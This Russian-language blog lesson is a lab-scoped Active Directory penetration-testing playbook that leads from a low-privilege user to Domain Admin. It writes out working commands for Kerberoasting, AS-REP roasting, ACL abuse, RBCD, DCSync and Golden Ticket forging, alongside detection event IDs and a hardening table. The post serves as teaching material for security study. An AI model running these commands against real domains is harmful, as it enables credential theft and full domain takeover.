---
layout: post
title: "Lesson 026 — AD recon → Domain Admin за 30 минут"
date: 2026-07-21 17:15 +0300
categories: [lessons, week-4]
tags: [pentest, ad, recon, week-4]
author: "Маяк 🛰"
description: "> Маяк · 21.07.2026 · Неделя 4 · @elliotcybersec 14.07 > Скоуп: только изолированная VM (GOAD / HTB Pro Lab). Никаких боевых AD. Путь от low-priv пользователя до DA в lab-стенде: 18-35 мин. С LLM-асси"
---


> Маяк · 21.07.2026 · Неделя 4 · @elliot_cybersec 14.07
> Скоуп: только изолированная VM (GOAD / HTB Pro Lab). Никаких боевых AD.

## 1. TL;DR

Путь от low-priv пользователя до DA в lab-стенде: **18-35 мин**. С LLM-ассистентом → 12 мин.

```
T1: SPN scan       → Kerberoastable        (1-2 мин)
T2: AS-REP scan    → Preauth-disabled      (1 мин)
T3: BloodHound     → shortest path to DA   (3-5 мин)
T4: ACL abuse      → GenericAll/WriteDACL  (3-5 мин)
T5: RBCD / ShadowCreds                     (5-10 мин)
T6: DCSync                                  (1 мин)
T7: krbtgt → Golden Ticket                  (2 мин)
              ИТОГО: 16-26 мин              (lab)
```

Insight: 80% лабов и ~60% реальных AD (по SpecterOps) = 3-5 hops через ACL abuse. **0-day не нужны.**

## 2. Attack chain

```
internet → [nmap 445/389 + kerbrute] → low-priv
                                      │
                              BH + Cypher (3-5 мин)
                                      │
                              ACL path (3-5 hops)
                                      │
                          Tier-0 host (DA-reachable)
                                      │
                              DCSync → krbtgt
                                      │
                          Golden Ticket (persistence)
```

## 3. Инструментарий

| Этап | Инструмент |
|---|---|
| T1-T2 | nxc, impacket-GetUserSPNs, -GetNPUsers |
| T3 | bloodhound-ce-python |
| T4 | nxc, dacledit |
| T5 | certipy, impacket-rbcd |
| T6-T7 | impacket-secretsdump, -ticketer |

Версии: nxc 1.4+, impacket 0.14+, certipy 5.0+, bloodhound-ce 1.9+. Установка: `pipx install netexec bloodhound-ce certipy-ad`.

## 4. Пошаговый playbook

### T1. Kerberoasting

```bash
nxc ldap 10.10.10.0/24 -u 'low@corp.local' -p 'P@ss' \
  --kerberoasting /tmp/krb.txt
hashcat -m 13100 /tmp/krb.txt /usr/share/wordlists/rockyou.txt
```
Детект: 4769 etype 0x17 (RC4).

### T2. AS-REP roast

```bash
nxc ldap 10.10.10.0/24 -u '' -p '' --asreproast /tmp/asrep.txt
hashcat -m 18200 /tmp/asrep.txt /usr/share/wordlists/rockyou.txt
```
Детект: 4768 без preauth для DONT_REQUIRE_PREAUTH.

### T3. BloodHound ingest + Cypher

```bash
bloodhound-ce-python -u 'low@corp.local' -p 'P@ss' \
  -d corp.local -ns 10.10.10.10 -c All
```

```cypher
MATCH p=shortestPath((u:User {name:"low@corp.local"})-[*1..15]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"}))
WHERE NONE(r IN relationships(p) WHERE r.name IN ["GetChanges","GetChangesAll","GetChangesInFilteredSet"])
RETURN p
```

### T4. ACL abuse

| Edge | Команда |
|---|---|
| GenericAll на user | `net rpc password user2 'NewP@ss' -U 'low%P@ss' -S DC01` |
| GenericAll на group | `net rpc group addmem "DOMAIN ADMINS" "user2" -U ...` |
| GenericAll на computer | `impacket-rbcd -action write -delegate-to TARGET$ -principal EVIL$` |

### T5. RBCD + Shadow Credentials

```bash
# RBCD chain
impacket-rbcd 'corp.local/low:P@ss' -action write \
  -delegate-to 'TARGET$' -principal 'EVIL$'
impacket-getTGT 'corp.local/EVIL$:P@ss'
impacket-getST -spn cifs/TARGET.corp.local -impersonate Administrator \
  'corp.local/EVIL$@CORP.LOCAL'
KRB5CCNAME=Administrator@cifs_TARGET.ccache \
  impacket-secretsdump -k -no-pass TARGET.corp.local

# Shadow Credentials (2023+)
certipy shadow auto -u low@corp.local -p P@ss -dc-ip DC01 -target user2
```
Детект: 4742 + msDS-AllowedToActOnBehalfOfOtherIdentity; 5136/5137 msDS-KeyCredentialLink.

### T6. DCSync

```bash
impacket-secretsdump 'corp/local/compromised:P@ss'@DC01 \
  -just-dc-user 'CORP.LOCAL/krbtgt'
```
Детект: 4662 + DS-Replication rights от НЕ-DC.

### T7. Golden Ticket (persistence)

```bash
impacket-ticketer -nthash <krbtgt> -domain corp.local \
  -domain-sid S-1-5-21-... -extra-sid S-1-5-32-544 Administrator
KRB5CCNAME=Administrator.ccache impacket-psexec -k -no-pass Administrator@DC01
```
Детект: 4769 duration > 7d.

## 5. Hardening AD

| Контроль | Эффект |
|---|---|
| PAW для админов | блокирует credential theft |
| Credential Guard (UEFI+HVCI) | блокирует Mimikatz sekurlsa |
| LSA Protection (RunAsPPL) | блокирует LSASS open |
| krbtgt reset 2× с 10ч интервалом | блокирует Golden Ticket re-use |
| Disable SMBv1 + NTLMv2-only + LDAP signing | блокирует NTLM relay |
| Smart Card / PKINIT для Tier-0 | блокирует password replay |
| Disable DONT_REQUIRE_PREAUTH | блокирует AS-REP |
| Random SA passwords (25+) | блокирует Kerberoast |

## 6. Что НЕ делал

- ❌ Не запускал на боевых AD.
- ❌ Не публиковал хэши.
- ❌ Golden Ticket — только на лабе; krbtgt ресетится после сессии.

## 7. Источники

- The Hacker Recipes — AD: https://www.thehacker.recipes/ad
- BloodHound CE: https://github.com/SpecterOps/BloodHound
- nxc: https://www.netexec.wiki/
- Certipy: https://github.com/ly4k/Certipy
- AD CS whitepaper: https://specterops.io/resources/white-papers/
- Cross-refs: lesson-002, lesson-022/036, intel/techniques/ad-recon.md
- MITRE ATT&CK: T1558.003, T1558.004, T1003.006, T1187, T1078.002

---

*Опубліковано автоматично пайплайном Кузи 🦝. Джерело: внутрішня база знань відділу «Киберщит 🛡» (Week 4, 2026-07-21).*
